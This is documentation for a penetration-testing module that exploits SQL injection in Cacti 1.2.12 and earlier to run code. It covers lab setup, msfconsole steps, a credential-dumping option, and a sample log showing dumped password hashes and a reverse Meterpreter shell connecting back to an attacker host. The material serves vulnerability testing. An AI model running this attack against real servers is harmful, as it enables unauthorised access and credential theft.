## Vulnerable Application

This module exploits a SQL injection vulnerability in Cacti 1.2.12 and before.
An admin can exploit the filter variable within `color.php` to pull arbitrary
values as well as conduct stacked queries. With stacked queries, the
`path_php_binary` value is changed within the settings table to a payload,
and an update is called to execute the payload.

After calling the payload, the value is reset. This has to be done from
a new login session as any requests with the already logged in cookie
will timeout.

### Install

### Docker

```
git clone https://github.com/scline/docker-cacti.git
cd docker-cacti

rm -rf cacti
git checkout 1.2.11 -- cacti
cp ./docker-compose/cacti_testing.yml ./docker-compose.yml
sudo docker-compose up
```

Navigate to `localhost:80` and login with `admin:admin` and run through the install steps.

### Ubuntu

As of the writing of this module, Ubuntu's 12.04 repo had cacti as
1.2.10, so a simple `apt-get install cacti` will install a vulnerable
version.

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use modules/exploits/unix/http/cacti_filter_sqli_rce`
1. Do: `set rhost [ip]`
1. Do: `set username [username]`
1. Do: `set password [password]`
1. Do: `run`
1. You should get a shell.

## Options

### CREDS

This option will dump usernames and passwords from cacti and database them. Defaults to `true`

## Scenarios

### Cacti 1.2.10 on Ubuntu 20.04

```
[*] Processing cacti.rb for ERB directives.
resource (cacti.rb)> use modules/exploits/unix/http/cacti_filter_sqli_rce
[*] Using configured payload php/meterpreter/reverse_tcp
resource (cacti.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (cacti.rb)> set verbose true
verbose => true
resource (cacti.rb)> set password cacti
password => cacti
resource (cacti.rb)> set lhost 2.2.2.2
lhost => 2.2.2.2
resource (cacti.rb)> run
[*] Started reverse TCP handler on 2.2.2.2:4444 
[*] Grabbing CSRF
[+] CSRF: sid:68e686c74fdfc4c04ed024ac27aba1d4815d5ad7,1621164610
[*] Attempting login
[*] Dumping creds
[+] Username: admin, Password Hash: $2y$10$fz.rRKSZPUMPccWOuCtWiO3csioHb8L7319uKAiMXZez2/HtLSg4q
[+] Username: guest, Password Hash: 43e9a4ab75570f5b
[*] Backing-up path_php_binary value
[+] path_php_binary: /usr/bin/php
[*] Uploading payload
[+] Executing Payload
[*] Sending stage (39282 bytes) to 1.1.1.1
[*] Meterpreter session 1 opened (2.2.2.2:4444 -> 1.1.1.1:49470) at 2021-05-16 07:30:11 -0400
[*] Cleaning up environment
[*] Grabbing CSRF
[+] CSRF: sid:e17aa4e5f4aa6d4c189cea4b7f0539123f4b5439,1621164632
[*] Attempting login
[*] Resetting DB Value

meterpreter > getuid
Server username: www-data (33)
meterpreter > sysinfo
Computer    : ubuntu2004
OS          : Linux ubuntu2004 5.4.0-31-generic #35-Ubuntu SMP Thu May 7 20:20:34 UTC 2020 x86_64
Meterpreter : php/linux
```
